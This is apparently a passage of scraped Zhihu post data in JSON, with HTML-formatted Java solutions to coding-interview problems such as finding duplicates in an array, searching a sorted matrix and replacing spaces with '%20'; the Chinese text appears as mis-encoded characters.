class=\"n\">1</span><span class=\"o\">][</span><span class=\"n\">j</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">];</span>\n            <span class=\"k\">else</span> <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">pattern</span><span class=\"o\">[</span><span class=\"n\">j</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">]</span> <span class=\"o\">==</span> <span class=\"sc\">&#39;*&#39;</span><span class=\"o\">)</span>\n                <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">pattern</span><span class=\"o\">[</span><span class=\"n\">j</span> <span class=\"o\">-</span> <span class=\"n\">2</span><span class=\"o\">]</span> <span class=\"o\">==</span> <span class=\"n\">str</span><span class=\"o\">[</span><span class=\"n\">i</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">]</span> <span class=\"o\">||</span> <span class=\"n\">pattern</span><span class=\"o\">[</span><span class=\"n\">j</span> <span class=\"o\">-</span> <span class=\"n\">2</span><span class=\"o\">]</span> <span class=\"o\">==</span> <span class=\"sc\">&#39;.&#39;</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n                    <span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">][</span><span class=\"n\">j</span><span class=\"o\">]</span> <span class=\"o\">|=</span> <span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">][</span><span class=\"n\">j</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">];</span> <span class=\"c1\">// a* counts as single a\n</span><span class=\"c1\"></span>                    <span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">][</span><span class=\"n\">j</span><span class=\"o\">]</span> <span class=\"o\">|=</span> <span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">i</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">][</span><span class=\"n\">j</span><span class=\"o\">];</span> <span class=\"c1\">// a* counts as multiple a\n</span><span class=\"c1\"></span>                    <span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">][</span><span class=\"n\">j</span><span class=\"o\">]</span> <span class=\"o\">|=</span> <span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">][</span><span class=\"n\">j</span> <span class=\"o\">-</span> <span class=\"n\">2</span><span class=\"o\">];</span> <span class=\"c1\">// a* counts as empty\n</span><span class=\"c1\"></span>                <span class=\"o\">}</span> <span class=\"k\">else</span>\n                    <span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">][</span><span class=\"n\">j</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">][</span><span class=\"n\">j</span> <span class=\"o\">-</span> <span class=\"n\">2</span><span class=\"o\">];</span>   <span class=\"c1\">// a* only counts as empty\n</span><span class=\"c1\"></span>\n    <span class=\"k\">return</span> <span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">m</span><span class=\"o\">][</span><span class=\"n\">n</span><span class=\"o\">];</span>\n<span class=\"o\">}</span></code></pre></div><h2>å¾®ä¿¡å…¬ä¼—å·</h2><p>ä½ å¯ä»¥åœ¨æˆ‘çš„å¾®ä¿¡å…¬ä¼—å·åå°ä¸æˆ‘äº¤æµã€‚å¦å¤–ï¼Œå…¬ä¼—å·ä¹Ÿæä¾›äº†ä¸€ä»½æŠ€æœ¯é¢è¯•å¤ä¹ å¤§çº²ï¼Œä¸ä»…ç³»ç»Ÿæ•´ç†äº†é¢è¯•çŸ¥è¯†ç‚¹ï¼Œè€Œä¸”æ ‡æ³¨äº†å„ä¸ªçŸ¥è¯†ç‚¹çš„é‡è¦ç¨‹åº¦ï¼Œä»è€Œå¸®ä½ ç†æ¸…å¤šè€Œæ‚çš„é¢è¯•çŸ¥è¯†ç‚¹ï¼Œåå°å›å¤ &#34;å¤§çº²&#34; å³å¯é¢†å–ã€‚æˆ‘åŸºæœ¬æ˜¯æŒ‰ç…§è¿™ä¸ªå¤§çº²æ¥è¿›è¡Œå¤ä¹ çš„ï¼Œå¯¹æˆ‘æ‹¿åˆ°äº† BAT å¤´æ¡ç­‰ Offer èµ·åˆ°å¾ˆå¤§çš„å¸®åŠ©ã€‚ä½ ä»¬å®Œå…¨å¯ä»¥å’Œæˆ‘ä¸€æ ·æ ¹æ®å¤§çº²ä¸Šåˆ—çš„çŸ¥è¯†ç‚¹æ¥è¿›è¡Œå¤ä¹ ï¼Œå°±ä¸ç”¨çœ‹å¾ˆå¤šä¸é‡è¦çš„å†…å®¹ï¼Œä¹Ÿå¯ä»¥çŸ¥é“å“ªäº›å†…å®¹å¾ˆé‡è¦ä»è€Œå¤šå®‰æ’ä¸€äº›å¤ä¹ æ—¶é—´ã€‚å…¬ä¼—å·ä¹Ÿæä¾›äº†è¯¥é¡¹ç›®çš„ç¦»çº¿é˜…è¯»ç‰ˆæœ¬ï¼Œåå°å›å¤ &#34;ä¸‹è½½&#34; å³å¯é¢†å–ã€‚</p><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"937\" data-rawheight=\"354\" class=\"origin_image zh-lightbox-thumb\" width=\"937\" data-original=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;937&#39; height=&#39;354&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"937\" data-rawheight=\"354\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"937\" data-original=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_b.jpg\"/></figure><p></p>", 
            "topic": [
                {
                    "tag": "ç®—æ³•", 
                    "tagLink": "https://api.zhihu.com/topics/19553510"
                }, 
                {
                    "tag": "é¢è¯•", 
                    "tagLink": "https://api.zhihu.com/topics/19552079"
                }
            ], 
            "comments": []
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/68764745", 
            "userName": "CyC2018", 
            "userLink": "https://www.zhihu.com/people/de0dbaba77411ee53dd3207d762ad7d5", 
            "upvote": 2, 
            "title": "å‰‘æŒ‡ Offer é¢˜è§£ 3-9", 
            "content": "<ul><li><a href=\"https://zhuanlan.zhihu.com/p/68764745/edit#3-%E6%95%B0%E7%BB%84%E4%B8%AD%E9%87%8D%E5%A4%8D%E7%9A%84%E6%95%B0%E5%AD%97\" class=\"internal\">3. æ•°ç»„ä¸­é‡å¤çš„æ•°å­—</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68764745/edit#4-%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84%E6%9F%A5%E6%89%BE\" class=\"internal\">4. äºŒç»´æ•°ç»„ä¸­çš„æŸ¥æ‰¾</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68764745/edit#5-%E6%9B%BF%E6%8D%A2%E7%A9%BA%E6%A0%BC\" class=\"internal\">5. æ›¿æ¢ç©ºæ ¼</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68764745/edit#6-%E4%BB%8E%E5%B0%BE%E5%88%B0%E5%A4%B4%E6%89%93%E5%8D%B0%E9%93%BE%E8%A1%A8\" class=\"internal\">6. ä»å°¾åˆ°å¤´æ‰“å°é“¾è¡¨</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68764745/edit#7-%E9%87%8D%E5%BB%BA%E4%BA%8C%E5%8F%89%E6%A0%91\" class=\"internal\">7. é‡å»ºäºŒå‰æ ‘</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68764745/edit#8-%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E4%B8%8B%E4%B8%80%E4%B8%AA%E7%BB%93%E7%82%B9\" class=\"internal\">8. äºŒå‰æ ‘çš„ä¸‹ä¸€ä¸ªç»“ç‚¹</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68764745/edit#9-%E7%94%A8%E4%B8%A4%E4%B8%AA%E6%A0%88%E5%AE%9E%E7%8E%B0%E9%98%9F%E5%88%97\" class=\"internal\">9. ç”¨ä¸¤ä¸ªæ ˆå®ç°é˜Ÿåˆ—</a> </li></ul><h2>3. æ•°ç»„ä¸­é‡å¤çš„æ•°å­—</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/623a5ac0ea5b4e5f95552655361ae0a8%3FtpId%3D13%26tqId%3D11203%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>åœ¨ä¸€ä¸ªé•¿åº¦ä¸º n çš„æ•°ç»„é‡Œçš„æ‰€æœ‰æ•°å­—éƒ½åœ¨ 0 åˆ° n-1 çš„èŒƒå›´å†…ã€‚æ•°ç»„ä¸­æŸäº›æ•°å­—æ˜¯é‡å¤çš„ï¼Œä½†ä¸çŸ¥é“æœ‰å‡ ä¸ªæ•°å­—æ˜¯é‡å¤çš„ï¼Œä¹Ÿä¸çŸ¥é“æ¯ä¸ªæ•°å­—é‡å¤å‡ æ¬¡ã€‚è¯·æ‰¾å‡ºæ•°ç»„ä¸­ä»»æ„ä¸€ä¸ªé‡å¤çš„æ•°å­—ã€‚</p><div class=\"highlight\"><pre><code class=\"language-html\">Input:\n{2, 3, 1, 0, 2, 5}\n\nOutput:\n2</code></pre></div><h2>è§£é¢˜æ€è·¯</h2><p>è¦æ±‚æ—¶é—´å¤æ‚åº¦ O(N)ï¼Œç©ºé—´å¤æ‚åº¦ O(1)ã€‚å› æ­¤ä¸èƒ½ä½¿ç”¨æ’åºçš„æ–¹æ³•ï¼Œä¹Ÿä¸èƒ½ä½¿ç”¨é¢å¤–çš„æ ‡è®°æ•°ç»„ã€‚</p><p>å¯¹äºè¿™ç§æ•°ç»„å…ƒç´ åœ¨ [0, n-1] èŒƒå›´å†…çš„é—®é¢˜ï¼Œå¯ä»¥å°†å€¼ä¸º i çš„å…ƒç´ è°ƒæ•´åˆ°ç¬¬ i ä¸ªä½ç½®ä¸Šè¿›è¡Œæ±‚è§£ã€‚</p><p>ä»¥ (2, 3, 1, 0, 2, 5) ä¸ºä¾‹ï¼Œéå†åˆ°ä½ç½® 4 æ—¶ï¼Œè¯¥ä½ç½®ä¸Šçš„æ•°ä¸º 2ï¼Œä½†æ˜¯ç¬¬ 2 ä¸ªä½ç½®ä¸Šå·²ç»æœ‰ä¸€ä¸ª 2 çš„å€¼äº†ï¼Œå› æ­¤å¯ä»¥çŸ¥é“ 2 é‡å¤ï¼š</p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-90c8c1c7d3aed5e0874bc09d4cce3453_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"407\" data-rawheight=\"284\" data-thumbnail=\"https://pic4.zhimg.com/v2-90c8c1c7d3aed5e0874bc09d4cce3453_b.jpg\" class=\"content_image\" width=\"407\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;407&#39; height=&#39;284&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"407\" data-rawheight=\"284\" data-thumbnail=\"https://pic4.zhimg.com/v2-90c8c1c7d3aed5e0874bc09d4cce3453_b.jpg\" class=\"content_image lazy\" width=\"407\" data-actualsrc=\"https://pic4.zhimg.com/v2-90c8c1c7d3aed5e0874bc09d4cce3453_b.gif\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">boolean</span> <span class=\"nf\">duplicate</span><span class=\"o\">(</span><span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">nums</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">length</span><span class=\"o\">,</span> <span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">duplication</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">nums</span> <span class=\"o\">==</span> <span class=\"kc\">null</span> <span class=\"o\">||</span> <span class=\"n\">length</span> <span class=\"o\">&lt;=</span> <span class=\"n\">0</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"kc\">false</span><span class=\"o\">;</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">length</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n        <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">!=</span> <span class=\"n\">i</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">==</span> <span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]])</span> <span class=\"o\">{</span>\n                <span class=\"n\">duplication</span><span class=\"o\">[</span><span class=\"n\">0</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">];</span>\n                <span class=\"k\">return</span> <span class=\"kc\">true</span><span class=\"o\">;</span>\n            <span class=\"o\">}</span>\n            <span class=\"n\">swap</span><span class=\"o\">(</span><span class=\"n\">nums</span><span class=\"o\">,</span> <span class=\"n\">i</span><span class=\"o\">,</span> <span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]);</span>\n        <span class=\"o\">}</span>\n    <span class=\"o\">}</span>\n    <span class=\"k\">return</span> <span class=\"kc\">false</span><span class=\"o\">;</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">private</span> <span class=\"kt\">void</span> <span class=\"nf\">swap</span><span class=\"o\">(</span><span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">nums</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">i</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">j</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"kt\">int</span> <span class=\"n\">t</span> <span class=\"o\">=</span> <span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">];</span>\n    <span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">j</span><span class=\"o\">];</span>\n    <span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">j</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">t</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h2>4. äºŒç»´æ•°ç»„ä¸­çš„æŸ¥æ‰¾</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/abc3fe2ce8e146608e868a70efebf62e%3FtpId%3D13%26tqId%3D11154%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>ç»™å®šä¸€ä¸ªäºŒç»´æ•°ç»„ï¼Œå…¶æ¯ä¸€è¡Œä»å·¦åˆ°å³é€’å¢æ’åºï¼Œä»ä¸Šåˆ°ä¸‹ä¹Ÿæ˜¯é€’å¢æ’åºã€‚ç»™å®šä¸€ä¸ªæ•°ï¼Œåˆ¤æ–­è¿™ä¸ªæ•°æ˜¯å¦åœ¨è¯¥äºŒç»´æ•°ç»„ä¸­ã€‚</p><div class=\"highlight\"><pre><code class=\"language-html\">Consider the following matrix:\n[\n  [1,   4,  7, 11, 15],\n  [2,   5,  8, 12, 19],\n  [3,   6,  9, 16, 22],\n  [10, 13, 14, 17, 24],\n  [18, 21, 23, 26, 30]\n]\n\nGiven target = 5, return true.\nGiven target = 20, return false.</code></pre></div><h2>è§£é¢˜æ€è·¯</h2><p>è¦æ±‚æ—¶é—´å¤æ‚åº¦ O(M + N)ï¼Œç©ºé—´å¤æ‚åº¦ O(1)ã€‚å…¶ä¸­ M ä¸ºè¡Œæ•°ï¼ŒN ä¸º åˆ—æ•°ã€‚</p><p>è¯¥äºŒç»´æ•°ç»„ä¸­çš„ä¸€ä¸ªæ•°ï¼Œå°äºå®ƒçš„æ•°ä¸€å®šåœ¨å…¶å·¦è¾¹ï¼Œå¤§äºå®ƒçš„æ•°ä¸€å®šåœ¨å…¶ä¸‹è¾¹ã€‚å› æ­¤ï¼Œä»å³ä¸Šè§’å¼€å§‹æŸ¥æ‰¾ï¼Œå°±å¯ä»¥æ ¹æ® target å’Œå½“å‰å…ƒç´ çš„å¤§å°å…³ç³»æ¥ç¼©å°æŸ¥æ‰¾åŒºé—´ï¼Œå½“å‰å…ƒç´ çš„æŸ¥æ‰¾åŒºé—´ä¸ºå·¦ä¸‹è§’çš„æ‰€æœ‰å…ƒç´ ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-b16b0904f6dc2fbf3aa84ee43a3deaf0_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"324\" data-rawheight=\"446\" data-thumbnail=\"https://pic1.zhimg.com/v2-b16b0904f6dc2fbf3aa84ee43a3deaf0_b.jpg\" class=\"content_image\" width=\"324\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;324&#39; height=&#39;446&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"324\" data-rawheight=\"446\" data-thumbnail=\"https://pic1.zhimg.com/v2-b16b0904f6dc2fbf3aa84ee43a3deaf0_b.jpg\" class=\"content_image lazy\" width=\"324\" data-actualsrc=\"https://pic1.zhimg.com/v2-b16b0904f6dc2fbf3aa84ee43a3deaf0_b.gif\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">boolean</span> <span class=\"nf\">Find</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">target</span><span class=\"o\">,</span> <span class=\"kt\">int</span><span class=\"o\">[][]</span> <span class=\"n\">matrix</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">matrix</span> <span class=\"o\">==</span> <span class=\"kc\">null</span> <span class=\"o\">||</span> <span class=\"n\">matrix</span><span class=\"o\">.</span><span class=\"na\">length</span> <span class=\"o\">==</span> <span class=\"n\">0</span> <span class=\"o\">||</span> <span class=\"n\">matrix</span><span class=\"o\">[</span><span class=\"n\">0</span><span class=\"o\">].</span><span class=\"na\">length</span> <span class=\"o\">==</span> <span class=\"n\">0</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"kc\">false</span><span class=\"o\">;</span>\n    <span class=\"kt\">int</span> <span class=\"n\">rows</span> <span class=\"o\">=</span> <span class=\"n\">matrix</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">,</span> <span class=\"n\">cols</span> <span class=\"o\">=</span> <span class=\"n\">matrix</span><span class=\"o\">[</span><span class=\"n\">0</span><span class=\"o\">].</span><span class=\"na\">length</span><span class=\"o\">;</span>\n    <span class=\"kt\">int</span> <span class=\"n\">r</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">,</span> <span class=\"n\">c</span> <span class=\"o\">=</span> <span class=\"n\">cols</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">;</span> <span class=\"c1\">// ä»å³ä¸Šè§’å¼€å§‹\n</span><span class=\"c1\"></span>    <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"n\">r</span> <span class=\"o\">&lt;=</span> <span class=\"n\">rows</span> <span class=\"o\">-</span> <span class=\"n\">1</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">c</span> <span class=\"o\">&gt;=</span> <span class=\"n\">0</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">target</span> <span class=\"o\">==</span> <span class=\"n\">matrix</span><span class=\"o\">[</span><span class=\"n\">r</span><span class=\"o\">][</span><span class=\"n\">c</span><span class=\"o\">])</span>\n            <span class=\"k\">return</span> <span class=\"kc\">true</span><span class=\"o\">;</span>\n        <span class=\"k\">else</span> <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">target</span> <span class=\"o\">&gt;</span> <span class=\"n\">matrix</span><span class=\"o\">[</span><span class=\"n\">r</span><span class=\"o\">][</span><span class=\"n\">c</span><span class=\"o\">])</span>\n            <span class=\"n\">r</span><span class=\"o\">++;</span>\n        <span class=\"k\">else</span>\n            <span class=\"n\">c</span><span class=\"o\">--;</span>\n    <span class=\"o\">}</span>\n    <span class=\"k\">return</span> <span class=\"kc\">false</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h2>5. æ›¿æ¢ç©ºæ ¼</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/4060ac7e3e404ad1a894ef3e17650423%3FtpId%3D13%26tqId%3D11155%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>å°†ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­çš„ç©ºæ ¼æ›¿æ¢æˆ &#34;%20&#34;ã€‚</p><div class=\"highlight\"><pre><code class=\"language-text\">Input:\n&#34;A B&#34;\n\nOutput:\n&#34;A%20B&#34;</code></pre></div><h2>è§£é¢˜æ€è·¯</h2><p>åœ¨å­—ç¬¦ä¸²å°¾éƒ¨å¡«å……ä»»æ„å­—ç¬¦ï¼Œä½¿å¾—å­—ç¬¦ä¸²çš„é•¿åº¦ç­‰äºæ›¿æ¢ä¹‹åçš„é•¿åº¦ã€‚å› ä¸ºä¸€ä¸ªç©ºæ ¼è¦æ›¿æ¢æˆä¸‰ä¸ªå­—ç¬¦ï¼ˆ%20ï¼‰ï¼Œå› æ­¤å½“éå†åˆ°ä¸€ä¸ªç©ºæ ¼æ—¶ï¼Œéœ€è¦åœ¨å°¾éƒ¨å¡«å……ä¸¤ä¸ªä»»æ„å­—ç¬¦ã€‚</p><p>ä»¤ P1 æŒ‡å‘å­—ç¬¦ä¸²åŸæ¥çš„æœ«å°¾ä½ç½®ï¼ŒP2 æŒ‡å‘å­—ç¬¦ä¸²ç°åœ¨çš„æœ«å°¾ä½ç½®ã€‚P1 å’Œ P2 ä»åå‘å‰éå†ï¼Œå½“ P1 éå†åˆ°ä¸€ä¸ªç©ºæ ¼æ—¶ï¼Œå°±éœ€è¦ä»¤ P2 æŒ‡å‘çš„ä½ç½®ä¾æ¬¡å¡«å…… 02%ï¼ˆæ³¨æ„æ˜¯é€†åºçš„ï¼‰ï¼Œå¦åˆ™å°±å¡«å……ä¸Š P1 æŒ‡å‘å­—ç¬¦çš„å€¼ã€‚</p><p>ä»åå‘å‰éæ˜¯ä¸ºäº†åœ¨æ”¹å˜ P2 æ‰€æŒ‡å‘çš„å†…å®¹æ—¶ï¼Œä¸ä¼šå½±å“åˆ° P1 éå†åŸæ¥å­—ç¬¦ä¸²çš„å†…å®¹ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-3a357aa51f518a79f740282e310a623d_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"345\" data-rawheight=\"256\" data-thumbnail=\"https://pic2.zhimg.com/v2-3a357aa51f518a79f740282e310a623d_b.jpg\" class=\"content_image\" width=\"345\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;345&#39; height=&#39;256&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"345\" data-rawheight=\"256\" data-thumbnail=\"https://pic2.zhimg.com/v2-3a357aa51f518a79f740282e310a623d_b.jpg\" class=\"content_image lazy\" width=\"345\" data-actualsrc=\"https://pic2.zhimg.com/v2-3a357aa51f518a79f740282e310a623d_b.gif\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"n\">String</span> <span class=\"nf\">replaceSpace</span><span class=\"o\">(</span><span class=\"n\">StringBuffer</span> <span class=\"n\">str</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"kt\">int</span> <span class=\"n\">P1</span> <span class=\"o\">=</span> <span class=\"n\">str</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">()</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">;</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;=</span> <span class=\"n\">P1</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">str</span><span class=\"o\">.</span><span class=\"na\">charAt</span><span class=\"o\">(</span><span class=\"n\">i</span><span class=\"o\">)</span> <span class=\"o\">==</span> <span class=\"sc\">&#39; &#39;</span><span class=\"o\">)</span>\n            <span class=\"n\">str</span><span class=\"o\">.</span><span class=\"na\">append</span><span class=\"o\">(</span><span class=\"s\">&#34;  &#34;</span><span class=\"o\">);</span>\n\n    <span class=\"kt\">int</span> <span class=\"n\">P2</span> <span class=\"o\">=</span> <span class=\"n\">str</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">()</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">;</span>\n    <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"n\">P1</span> <span class=\"o\">&gt;=</span> <span class=\"n\">0</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">P2</span> <span class=\"o\">&gt;</span> <span class=\"n\">P1</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"kt\">char</span> <span class=\"n\">c</span> <span class=\"o\">=</span> <span class=\"n\">str</span><span class=\"o\">.</span><span class=\"na\">charAt</span><span class=\"o\">(</span><span class=\"n\">P1</span><span class=\"o\">--);</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">c</span> <span class=\"o\">==</span> <span class=\"sc\">&#39; &#39;</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"n\">str</span><span class=\"o\">.</span><span class=\"na\">setCharAt</span><span class=\"o\">(</span><span class=\"n\">P2</span><span class=\"o\">--,</span> <span class=\"sc\">&#39;0&#39;</span><span class=\"o\">);</span>\n            <span class=\"n\">str</span><span class=\"o\">.</span><span class=\"na\">setCharAt</span><span class=\"o\">(</span><span class=\"n\">P2</span><span class=\"o\">--,</span> <span class=\"sc\">&#39;2&#39;</span><span class=\"o\">);</span>\n            <span class=\"n\">str</span><span class=\"o\">.</span><span class=\"na\">setCharAt</span><span class=\"o\">(</span><span class=\"n\">P2</span><span class=\"o\">--,</span> <span class=\"sc\">&#39;%&#39;</span><span class=\"o\">);</span>\n        <span class=\"o\">}</span> <span class=\"k\">else</span> <span class=\"o\">{</span>\n            <span class=\"n\">str</span><span class=\"o\">.</span><span class=\"na\">setCharAt</span><span class=\"o\">(</span><span class=\"n\">P2</span><span class=\"o\">--,</span> <span class=\"n\">c</span><span class=\"o\">);</span>\n        <span class=\"o\">}</span>\n    <span class=\"o\">}</span>\n    <span class=\"k\">return</span> <span class=\"n\">str</span><span class=\"o\">.</span><span class=\"na\">toString</span><span class=\"o\">();</span>\n<span class=\"o\">}</span></code></pre></div><h2>6. ä»å°¾åˆ°å¤´æ‰“å°é“¾è¡¨</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/d0267f7f55b3412ba93bd35cfa8e8035%3FtpId%3D13%26tqId%3D11156%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>ä»å°¾åˆ°å¤´åè¿‡æ¥æ‰“å°å‡ºæ¯ä¸ªç»“ç‚¹çš„å€¼ã€‚</p><figure data-size=\"normal\"><noscript><img 